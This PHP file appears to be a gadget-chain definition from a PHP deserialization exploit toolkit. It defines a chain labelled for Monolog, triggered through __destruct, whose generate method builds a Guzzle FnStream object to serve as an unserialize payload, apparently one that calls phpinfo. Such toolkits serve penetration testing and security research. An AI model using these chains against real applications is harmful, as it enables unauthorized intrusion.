<?php

namespace GadgetChain\Monolog;

class INFO1 extends \PHPGGC\GadgetChain\PHPInfo
{
    public static $version = '2.0.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \GuzzleHttp\Stream\FnStream();
    }
}